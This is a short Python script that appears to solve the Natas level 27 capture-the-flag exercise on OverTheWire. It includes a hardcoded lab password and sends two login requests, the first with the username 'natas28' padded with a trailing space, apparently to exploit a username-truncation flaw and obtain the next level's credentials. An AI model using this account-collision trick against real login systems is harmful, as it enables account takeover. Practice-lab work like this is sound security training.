import requests, re
import base64
import urllib
u='natas27'
p='55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'
l=f'http://{u}.natas.labs.overthewire.org/'
sess=requests.Session()
resp=sess.post(l,data={'username':'natas28'+' ','password':'mikey2520'},auth=(u, p))
resp=sess.post(l,data={'username':'natas28','password':'mikey2520'},auth=(u, p))
print(resp.text)
